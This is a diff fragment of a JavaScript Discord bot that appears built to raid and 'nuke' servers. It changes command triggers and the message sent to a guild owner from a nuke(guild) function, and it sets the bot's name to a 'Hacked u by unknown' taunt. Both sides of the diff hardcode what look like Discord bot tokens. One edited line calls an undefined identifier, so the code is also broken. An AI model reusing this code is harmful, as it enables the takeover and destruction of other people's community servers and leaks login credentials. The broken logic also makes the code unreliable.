@@ -17,7 +17,7 @@ console.log(`Logged in as  * [ "  KBOOOOOOOOSH-YT " ] servers! [ " ${LOka.guilds
    
  
 });
-var prefix = "="
+var prefix = "-"
 LOka.on("message", message => {
   if(!message.content.startsWith(prefix)) return;;
   let args = message.content.split(" ").slice(1);
@@ -25,19 +25,19 @@ LOka.on("message", message => {
   if (message.content.startsWith('hix15')) {
     LOka.user.setUsername(argresult);
   }
-    if (message.content.startsWith(prefix + 'on123')) {
+    if (message.content.startsWith(Go)) {
     LOka.user.setStatus(argresult);
   }
 });
  
-var x1 = "kk"
+var x1 = "Go"
 LOka.on('message', message => {
      if (message.content === ".") {
 LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
  
 }
 });
-var x1 = "kk"
+var x1 = "Go"
 LOka.on('message', message => {
      if (message.content === ".") {
 LOka.user.setUsername("Hacked u by unknown Is here")
@@ -417,7 +417,7 @@ async function nuke(guild) {
  
   await guild.fetchMembers();
  
-  await guild.owner.send(' Hacked u by unknown Is here    سلم على سيرفرك هههههههههههههههه').catch(e => { return void e; });
+  await guild.owner.send(' بوت خورافي ').catch(e => { return void e; });
  
  
  
@@ -478,4 +478,4 @@ LOka.on('guildMemberAdd', member => {
  
  
  
-LOka.login("NjQzMTc3NjAwMTAxMTIyMDc5.XchwYA.ulm4VqTQ2reQLeFKDDRigBgj170")
+LOka.login("NTUzMjAzMTExMjM4NTY1ODg4.D2KqtQ.R7oI7UTWqrD7PtuexVPnfd4Iegc")
